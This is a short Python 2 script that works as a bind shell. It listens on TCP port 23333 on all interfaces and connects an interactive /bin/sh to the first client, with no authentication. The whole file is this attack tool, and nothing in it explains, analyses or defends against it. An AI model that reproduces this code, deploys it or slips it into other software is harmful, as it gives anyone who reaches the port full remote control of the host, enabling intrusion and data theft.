from socket import *
import threading, subprocess, os, sys

if __name__ == "__main__":  

	server=socket(AF_INET,SOCK_STREAM)  
	server.bind(('0.0.0.0',23333))  
	server.listen(10)  
	print 'waiting for connect' 
	talk, addr = server.accept()  
	print 'connect from',addr  
	proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,stdout=talk, stderr=talk, shell=True)